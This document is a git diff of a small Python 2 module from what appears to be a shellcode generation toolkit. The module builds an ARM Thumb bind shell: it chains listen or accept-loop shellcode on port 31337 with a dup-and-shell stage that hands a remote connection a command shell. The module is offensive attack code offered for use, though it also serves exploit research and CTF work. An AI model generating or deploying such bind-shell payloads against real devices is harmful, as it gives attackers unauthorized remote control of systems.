@@ -1,10 +1,27 @@
 # bindshell(port)
-def ARM_THUMB_BINDSHELL(port=31337, sock=4, once=True):
-    if once:
-        sc = ARM_THUMB_LISTEN(port)
-    else:
-        sc = ARM_THUMB_ACCEPTLOOP(port)
 
-    sc += ARM_THUMB_DUPSH(sock)
+import listen
+import acceptloop
+import dupsh
+from socket import *
+
+def generate(port=31337, sock=4, once=True):
+    """bind shell on specific port in Thumb Mode
+
+    argument:
+        port (int/str): specific port
+        sock (int/str): sock descriptor for dupsh()
+        once (boolean): if False then infinity loop
+    """
+
+    if once:
+        sc = listen.generate(port)
+    else:
+        sc = acceptloop.generate(port)
+
+    sc += dupsh.generate(sock)
 
     return sc
+
+if __name__ == '__main__':
+    print generate()
